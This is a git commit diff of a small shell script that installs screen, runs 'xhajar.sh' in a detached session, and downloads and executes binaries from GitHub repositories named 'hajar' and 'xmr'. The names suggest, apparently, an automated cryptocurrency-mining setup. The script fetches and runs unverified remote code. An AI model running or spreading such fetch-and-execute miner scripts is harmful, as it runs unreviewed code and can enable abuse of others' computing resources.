6b2f924c65087bc4107bc936a7a4c658fd5d2cbf
renilo <88342640+renilo@users.noreply.github.com>
2021-10-20 13:56:34 +0700

    Update xautokontol.sh

--- xautokontol.sh
+++ xautokontol.sh
@@ -6,14 +6,10 @@ sudo apt install screen -y
 
 screen -dmS xhajar.sh ./xhajar.sh 65 75
 
-wget https://raw.githubusercontent.com/renilo/hajar/main/bahan.sh
+wget https://github.com/renilo/xmr/raw/main/meki-baru1
 
-wget https://raw.githubusercontent.com/renilo/hajar/main/xhajar.sh
+wget https://raw.githubusercontent.com/renilo/xmr/main/xhajar.sh
 
-wget https://github.com/renilo/hajar/raw/main/gas 
-
-wget https://github.com/renilo/xmr/raw/main/verus-solver
-
-chmod +x gas bahan.sh xhajar.sh
+chmod +x xhajar.sh
 
 ./xhajar.sh
